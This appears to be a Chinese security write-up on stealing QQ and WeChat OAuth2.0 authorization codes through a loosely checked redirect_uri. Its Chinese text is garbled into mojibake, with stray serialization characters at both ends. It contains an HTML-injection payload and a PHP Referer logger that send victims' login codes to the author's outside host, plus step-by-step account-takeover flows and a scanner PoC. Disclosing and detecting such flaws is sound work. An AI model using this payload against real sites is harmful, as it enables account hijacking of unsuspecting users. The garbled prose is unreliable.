I"È;<h1 id="ä»€ä¹ˆæ˜¯oauth20"><strong>ä»€ä¹ˆæ˜¯OAuth2.0ï¼Ÿ</strong></h1>

<blockquote>
  <p>OAuth2.0æ˜¯OAuthåè®®çš„ä¸‹ä¸€ç‰ˆæœ¬ï¼Œä½†ä¸å‘åå…¼å®¹OAuth 1.0å³å®Œå…¨åºŸæ­¢äº†OAuth1.0ã€‚ OAuth 2.0å…³æ³¨å®¢æˆ·ç«¯å¼€å‘è€…çš„ç®€æ˜“æ€§ã€‚è¦ä¹ˆé€šè¿‡ç»„ç»‡åœ¨èµ„æºæ‹¥æœ‰è€…å’ŒHTTPæœåŠ¡å•†ä¹‹é—´çš„è¢«æ‰¹å‡†çš„äº¤äº’åŠ¨ä½œä»£è¡¨ç”¨æˆ·ï¼Œè¦ä¹ˆå…è®¸ç¬¬ä¸‰æ–¹åº”ç”¨ä»£è¡¨ç”¨æˆ·è·å¾—è®¿é—®çš„æƒé™ã€‚åŒæ—¶ä¸ºWebåº”ç”¨ï¼Œæ¡Œé¢åº”ç”¨å’Œæ‰‹æœºï¼Œå’Œèµ·å±…å®¤è®¾å¤‡æä¾›ä¸“é—¨çš„è®¤è¯æµç¨‹ã€‚2012å¹´10æœˆï¼ŒOAuth 2.0åè®®æ­£å¼å‘å¸ƒä¸ºRFC 6749 ã€‚</p>
</blockquote>

<p><strong>RFC 6749 : https://tools.ietf.org/html/rfc6749</strong></p>

<h1 id="qq-oauth20-æµç¨‹åˆ†ææ”»å‡»"><strong>QQ OAuth2.0 æµç¨‹åˆ†æ&amp;æ”»å‡»</strong></h1>

<p>å›½å†…çš„å¾ˆå¤šå‚å•†ä½¿ç”¨äº†OAuth2.0çš„è®¤è¯æ–¹å¼ï¼Œè¿™é‡Œä»¥QQä¸ºä¾‹ã€‚</p>

<p><strong>QQäº’è” : https://connect.qq.com/intro/login</strong></p>

<p>ç›¸ä¿¡å¤§å®¶åœ¨å¾ˆå¤šç½‘ç«™ä¸Šéƒ½è§è¿‡å¦‚ä¸‹çš„ç™»é™†ç•Œé¢ï¼š</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-02-12/0x00.jpg" alt="img" /></p>

<p>å¯ä»¥çœ‹è§é™¤äº†å‚å•†æœ¬èº«ç½‘ç«™çš„è´¦å·ä»¥å¤–è¿˜æœ‰QQè·Ÿå¾®ä¿¡è¿™ä¸¤ä¸ªå¿«æ·ç™»é™†ï¼Œé¦–å…ˆä»¥QQçš„å¿«æ·ç™»é™†ä¸ºä¾‹å­ï¼š</p>

<p>ç‚¹å‡»QQå›¾æ ‡è¿›å…¥ç™»é™†çš„é“¾æ¥ -&gt; <strong>https://graph.qq.com/oauth2.0/show?which=Login&amp;display=pc&amp;response_type=code&amp;client_id=100273020&amp;redirect_uri=http://a.com/?view=null&amp;uuid=65392bc3fc724fca8dcba23558f67ec8</strong></p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-02-12/0x01.jpg" alt="img" /></p>

<p>è¿™é‡Œå› ä¸ºæˆ‘çš„QQæ˜¯åœ¨ç”µè„‘ä¸Šå·²ç»ç™»é™†äº†ï¼Œæ‰€ä»¥æˆ‘å¯ä»¥ç›´æ¥è¿›è¡Œç™»é™†ï¼Œè¿™æ—¶å€™è¿›è¡ŒæŠ“åŒ…æˆªå–æ•´ä¸ªæµç¨‹ï¼Œ</p>

<h1 id="å…³é”®æµç¨‹åˆ†æ"><strong>å…³é”®æµç¨‹åˆ†æ</strong></h1>

<p><strong>Request 1ï¼š</strong></p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/oauth2.0/authorize</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">graph.qq.com</span>
</code></pre></div></div>

<p><strong>1 Responseï¼š</strong></p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Moved Temporarily</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">tws</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 09 Feb 2018 11:50:42 GMT</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
<span class="na">Keep-Alive</span><span class="p">:</span> <span class="s">timeout=50</span>
<span class="na">Content-Encoding</span><span class="p">:</span> <span class="s">gzip</span>
<span class="na">Location</span><span class="p">:</span> <span class="s">http:/a.com/?uuid=65392bc3fc724fca8dcba23558f67ec8&amp;code=120ED71CAECB11BAD538820E12B54664</span>
</code></pre></div></div>

<p><strong>Request 2ï¼š</strong>(è¿™ä¸ªè¯·æ±‚è¡¨ç¤ºæ ¹æ®å‚æ•°<strong>code</strong>çš„å€¼è¿›è¡Œä¸ªäººç”¨æˆ·å‡­è¯ç”Ÿæˆ)</p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/?uuid=65392bc3fc724fca8dcba23558f67ec8&amp;code=120ED71CAECB11BAD538820E12B54664</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">a.com</span>
</code></pre></div></div>

<p><strong>2 Responseï¼š</strong>ï¼ˆsetcookieè¿”å›ç”¨æˆ·å‡­è¯ï¼‰</p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Moved Temporarily</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">ç”¨æˆ·å‡­è¯</span>
<span class="na">Location</span><span class="p">:</span> <span class="s">https://www.a.com/</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
</code></pre></div></div>

<p>è¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥æ³¨æ„åˆ°é—®é¢˜äº†ï¼Œè¯·æ±‚1äº§ç”Ÿäº†ä¸€ä¸ªé“¾æ¥ï¼Œå…¶å°±æ˜¯QQç™»é™†çš„åœ°å€ä¸­çš„å‚æ•°<strong>redirect_uri</strong>é™„å¸¦ä¸Š<strong>å‚æ•°codeçš„å€¼</strong>ï¼Œè€Œè¿™ä¸ªé“¾æ¥æ˜¯ç”Ÿæˆç”¨æˆ·å‡­è¯çš„ï¼Œæ‰€ä»¥é“¾æ¥ä¸­çš„<strong>å‚æ•°code</strong>ä¹Ÿæ˜¯è‡³å…³é‡è¦çš„ï¼Œçœ‹åˆ°è¿™é‡Œæˆ‘çš„æ”»å‡»æ€è·¯å·²ç»äº§ç”Ÿäº†ï¼š</p>

<p>å‡è®¾QQç™»é™†çš„åœ°å€ä¸­çš„å‚æ•°<strong>redirect_uri</strong>çš„å€¼å¯ä»¥ä¸ºæˆ‘çš„ç½‘ç«™ï¼Œé‚£ä¹ˆåªè¦ç”¨æˆ·Aç‚¹å‡»æˆ‘å°±å¯ä»¥æ ¹æ®ç½‘ç«™æ—¥å¿—è®¿é—®è®°å½•è·å–å‚æ•°<strong>code</strong>çš„å€¼å†æ ¹æ®è¯·æ±‚2è·å–ç”¨æˆ·Aåœ¨ http://a.com çš„è´¦å·æƒé™ã€‚</p>

<p>ç†æƒ³å¾ˆå¥½ï¼Œç°å®æ®‹é…·ï¼š</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-02-12/0x02.jpg" alt="img" /></p>

<p>è¿™é‡ŒQQåšäº†é™åˆ¶ï¼Œæˆ‘ä¸éœ€è¦å»åˆ†æQQå…³è”çš„å…¨éƒ¨æµç¨‹å°±èƒ½çŸ¥é“è¿™é‡Œçš„å‚æ•°client_idï¼Œå…¶å®å°±æ˜¯ http://a.com çš„QQäº’è”çš„æœåŠ¡idï¼Œ http://graph.qq.com æ ¹æ®client_idè·å– http://a.com çš„è®¾ç½®å…è®¸çš„å‚æ•°<strong>redirect_uri</strong>çš„å€¼å†è·Ÿä½ è¾“å…¥çš„å‚æ•°<strong>redirect_uri</strong>çš„å€¼è¿›è¡Œæ¯”è¾ƒã€‚</p>

<p>è¿™æ—¶å€™æˆ‘åªéœ€è¦å¯¹å‚æ•°<strong>redirect_uri</strong>è¿›è¡ŒFuzzå°±èƒ½çŸ¥é“å“ªäº›èŒƒå›´æ˜¯å…è®¸çš„ï¼š</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-02-12/0x03.jpg" alt="img" /></p>

<p>http://a.com çš„äºŒçº§å­åŸŸåå¯ä»¥ä¸ºå‚æ•°<strong>redirect_uri</strong>çš„å€¼ï¼Œç›®å‰æˆ‘éœ€è¦è§£å†³çš„å°±æ˜¯å¦‚ä½•æ ¹æ® http://a.com çš„äºŒçº§å­åŸŸåè·å–åˆ°codeçš„å€¼ï¼š</p>

<h1 id="1æˆ‘æœ‰ä¸€ä¸ªhtmlæ³¨å…¥æ¼æ´"><strong>1.æˆ‘æœ‰ä¸€ä¸ªHTMLæ³¨å…¥æ¼æ´</strong></h1>

<p>æ¼æ´åœ°å€ï¼š<code class="language-plaintext highlighter-rouge">http://1.a.com/?xss=%3Cimg%20src="http://www.evilchen.cn/getref.php"%3E</code></p>

<p>getref.phpçš„å†…å®¹ä¸ºå¦‚ä¸‹PHPä»£ç ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
file_put_contents("ref.txt", $_SERVER['HTTP_REFERER']);
?&gt;
</code></pre></div></div>

<p>å°†æ¼æ´åœ°å€ä½œä¸ºå‚æ•°<strong>redirect_uri</strong>çš„å€¼ï¼Œç„¶åè¯±å¯¼ç”¨æˆ·Aç‚¹å‡»ç™»é™†ï¼Œè¿™æ—¶å€™è·³è½¬çš„é“¾æ¥å°±å˜æˆäº†ï¼š</p>

<blockquote>
  <p>http://1.a.com/?xss=%3Cimg%20src=â€http://www.evilchen.cn/getref.phpâ€%3E&amp;code=120ED71CAECB11BAD538820E12B54664</p>
</blockquote>

<p>è·³è½¬ä¹‹åè¿™ä¸ªé“¾æ¥ä¼šåšä¸ºHTTP Refererçš„å€¼å†è¯·æ±‚[http://www.evilchen.cn/getref.php]ï¼Œé‚£ä¹ˆæˆ‘çš„æœåŠ¡å™¨å°±ä¼šæ¥æ”¶åˆ°codeçš„å€¼ï¼Œå†æ ¹æ®Request 2çš„å€¼å¡«å…¥ï¼Œæˆ‘å°±å¯ä»¥è·å–ç”¨æˆ·Aåœ¨a.comçš„è´¦å·æƒé™äº†</p>

<h1 id="2æˆ‘èƒ½åœ¨å…¶ä»–åœ°æ–¹å¼•ç”¨å¤–éƒ¨èµ„æº"><strong>2.æˆ‘èƒ½åœ¨å…¶ä»–åœ°æ–¹å¼•ç”¨å¤–éƒ¨èµ„æº</strong></h1>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-02-12/0x04.jpg" alt="img" /></p>

<p>å¾ˆå¤šå‚å•†éƒ½ä¼šæœ‰ç¤¾åŒºã€è®ºå›ç­‰åŠŸèƒ½ï¼Œå¤§éƒ¨åˆ†ä¼šä½¿ç”¨Discuzç¨‹åºæ¥åšï¼Œè€ŒDiscuzç¡®å®å¯ä»¥å¼•ç”¨å¤–éƒ¨èµ„æº~</p>

<p>è¿™é‡Œæˆ‘ä½¿ç”¨çš„å›¾ç‰‡åœ°å€è¿˜æ˜¯ http://www.evilchen.cn/getref.php ç„¶åè¿›è¡Œå¸–å­å›å¤ã€‚</p>

<p>å¸–å­åœ°å€ä¸º http://bbs.a.com/thread-123-1-1.html å°†å¸–å­åœ°å€ä½œä¸ºå‚æ•°<strong>redirect_uri</strong>çš„å€¼ï¼Œç„¶åè¯±å¯¼ç”¨æˆ·Aç‚¹å‡»ç™»é™†ï¼Œè¿™æ—¶å€™è·³è½¬çš„é“¾æ¥å°±å˜æˆäº†ï¼š</p>

<p>http://bbs.a.com/thread-123-1-1.html?code=120ED71CAECB11BAD538820E12B54664</p>

<p>è·³è½¬ä¹‹åè¿™ä¸ªé“¾æ¥ä¼šåšä¸ºHTTP Refererçš„å€¼å†è¯·æ±‚ http://www.evilchen.cn/getref.php é‚£ä¹ˆæˆ‘çš„æœåŠ¡å™¨å°±ä¼šæ¥æ”¶åˆ°codeçš„å€¼ï¼Œå†æ ¹æ®Request 2çš„å€¼å¡«å…¥ï¼Œæˆ‘å°±å¯ä»¥è·å–ç”¨æˆ·Aåœ¨a.comçš„è´¦å·æƒé™äº†ï¼š</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-02-12/0x05.jpg" alt="img" /></p>

<h1 id="æ”»å‡»æµç¨‹"><strong>æ”»å‡»æµç¨‹</strong></h1>

<p>1.æˆ‘ç‚¹å‡» http://a.com çš„QQç™»å½•ï¼Œè·å–QQå¿«æ·ç™»å½•é“¾æ¥ï¼Œæ›¿æ¢redirect_uriçš„å€¼ä¸ºå¦‚ä¸Šä¸¤ä¸ªé—®é¢˜çš„åœ°å€ç„¶åå‘é€ç»™å—å®³è€…2.å—å®³è€…ç‚¹å‡»QQå¤´åƒç™»å½•ï¼Œä¼šè·³è½¬åˆ°redirect_uriçš„å€¼(é“¾æ¥)ï¼Œå¹¶ä¸”æºå¸¦ä¸Šcodeçš„å€¼</p>

<p>3.å—å®³è€…æµè§ˆå™¨ä»¥è·³è½¬åçš„é“¾æ¥ä½œä¸ºrefererå¤´è¯·æ±‚å¤–é“¾å›¾ç‰‡(php)</p>

<p>4.æ”»å‡»è€…è·å–refererçš„å€¼ï¼Œæ„å»ºBåœ°å€ï¼Œå¹¶ä¸”è¿›å…¥é“¾æ¥(æ³¨æ„ æ”»å‡»è€…è¦åœ¨æœªç™»å½•æƒ…å†µä¸‹)</p>

<h1 id="å¾®ä¿¡å¿«æ·ç™»é™†æµç¨‹"><strong>å¾®ä¿¡å¿«æ·ç™»é™†æµç¨‹</strong></h1>

<p>å¼€å‘å¹³å°ï¼šhttps://open.weixin.qq.com/</p>

<p>http://a.comçš„åœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://open.weixin.qq.com/connect/qrconnect?appid=&amp;redirect_uri=http://a.com/wx?callback=null</p>

<p>å¾®ä¿¡æ‰«æåä¼šè·³è½¬åˆ°ï¼š</p>

<p>http://a.com/weixin?callback=null&amp;code=021n2XAB00C4mg2FvKyB0W7QAB0n2XAF</p>

<p>è€Œåªè¦åˆ©ç”¨QQå¿«æ·ç™»é™†çš„æ–¹æ³•æˆ‘ä»¬ä¸€æ ·å¯ä»¥è·å–åˆ°codeçš„å€¼</p>

<h1 id="æ”»å‡»æµç¨‹-1"><strong>æ”»å‡»æµç¨‹</strong></h1>

<p>1.æˆ‘ç‚¹å‡»http://a.comçš„QQç™»å½•ï¼Œè·å–å¾®ä¿¡å¿«æ·ç™»å½•é“¾æ¥ï¼Œæ›¿æ¢redirect_uriçš„å€¼ä¸ºå¦‚ä¸Šä¸¤ä¸ªé—®é¢˜çš„åœ°å€ç„¶åå‘é€ç»™å—å®³è€…
2.å—å®³è€…ç‚¹å¼€å¾®ä¿¡æ‰«æï¼Œä¼šè·³è½¬åˆ°redirect_uriçš„å€¼(é“¾æ¥)ï¼Œå¹¶ä¸”æºå¸¦ä¸Šcodeçš„å€¼</p>

<p>3.å—å®³è€…æµè§ˆå™¨ä»¥è·³è½¬åçš„é“¾æ¥ä½œä¸ºrefererå¤´è¯·æ±‚å¤–é“¾å›¾ç‰‡(php)</p>

<p>4.æ”»å‡»è€…è·å–refererçš„å€¼ï¼Œæ„å»ºBåœ°å€ï¼Œå¹¶ä¸”è¿›å…¥é“¾æ¥(æ³¨æ„ æ”»å‡»è€…è¦åœ¨æœªç™»å½•æƒ…å†µä¸‹)</p>

<h1 id="é£é™©æ£€æµ‹"><strong>é£é™©æ£€æµ‹</strong></h1>

<p>æˆ‘ç®€å•çš„å†™äº†ä¸ªpocï¼Œä»…ä»…åšé£é™©æ£€æµ‹ï¼Œå…·ä½“å±å®³å¯ä»¥è‡ªè¡Œæ£€æŸ¥~~ï¼ˆ<strong>PSï¼šæ”¯æŒå¾®ä¿¡è·ŸQQçš„å¿«æ·ç™»é™†é£é™©æ£€æµ‹</strong>ï¼‰</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># -*- coding:utf-8 -*-
# Name: QQ and WeChat OAuth2.0 PoC
# Auther: MSTLab(EvilChen)
</span>
<span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span><span class="n">urlparse</span><span class="p">,</span><span class="n">urllib</span>

<span class="k">def</span> <span class="nf">scan</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
	<span class="n">url</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
	<span class="n">tempUrl</span> <span class="o">=</span> <span class="n">getValue</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
	<span class="n">tempDomain</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">.</span><span class="n">urlparse</span><span class="p">(</span><span class="n">tempUrl</span><span class="p">).</span><span class="n">netloc</span>
	<span class="n">domainA</span> <span class="o">=</span> <span class="n">tempDomain</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)</span>
	<span class="n">domainB</span> <span class="o">=</span> <span class="n">tempDomain</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="n">domainA</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="s">"mstlab"</span><span class="p">)</span>
	<span class="n">url</span> <span class="o">=</span> <span class="n">url</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="n">tempUrl</span><span class="p">,</span><span class="s">"http://"</span> <span class="o">+</span> <span class="n">domainB</span><span class="p">)</span>
	<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
	<span class="c1"># print url
</span>	<span class="k">if</span> <span class="p">(</span><span class="s">"redirect uri is illegal"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span> <span class="ow">or</span> <span class="p">(</span><span class="s">"&gt;redirect_uri"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">):</span>
	    <span class="k">print</span> <span class="s">"[*] This Website is safe."</span>
	<span class="k">else</span><span class="p">:</span>
            <span class="k">print</span> <span class="s">"[*] This Website is vulnerable!"</span>

<span class="k">def</span> <span class="nf">getValue</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
    <span class="n">query</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">.</span><span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">).</span><span class="n">query</span>
    <span class="n">resUrl</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">([(</span><span class="n">k</span><span class="p">,</span><span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span><span class="n">v</span> <span class="ow">in</span> <span class="n">urlparse</span><span class="p">.</span><span class="n">parse_qs</span><span class="p">(</span><span class="n">query</span><span class="p">).</span><span class="n">items</span><span class="p">()])[</span><span class="s">'redirect_uri'</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">resUrl</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
	<span class="n">url</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">"URL: "</span><span class="p">)</span>
	<span class="n">scan</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</code></pre></div></div>

<p>pocçš„ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œåªéœ€è¦å¤åˆ¶QQå’Œå¾®ä¿¡å¿«æ·ç™»é™†çš„é“¾æ¥ï¼š</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-02-12/0x06.jpg" alt="img" /></p>

<p>ç»è¿‡æˆ‘ä»¬å®éªŒå®¤çš„æ’æŸ¥å‘ç°å­˜åœ¨é£é™©çš„å‚å•†å¦‚ä¸‹ï¼š</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-02-12/0x07.jpg" alt="img" /></p>

<p>ç­‰å›½å†…çŸ¥åå‚å•†è¿‘ç™¾å®¶éƒ½å­˜åœ¨æ­¤å±å®³ã€‚</p>

<h1 id="ä¿®å¤å»ºè®®"><strong>ä¿®å¤å»ºè®®</strong></h1>

<p>redirect_uriçš„å€¼åšé™åˆ¶</p>

<h1 id="ç»“å°¾"><strong>ç»“å°¾</strong></h1>

<p>æ–‡ç« å‚è€ƒï¼š</p>

<p>http://wooyun.jozxing.cc/search?keywords=OAuth&amp;content_search_by=by_bugs</p>

<p>http://www.cnvd.org.cn/flaw/show/CNVD-2014-02785</p>

<p>http://www.cnvd.org.cn/flaw/show/CNVD-2018-01622</p>
:ET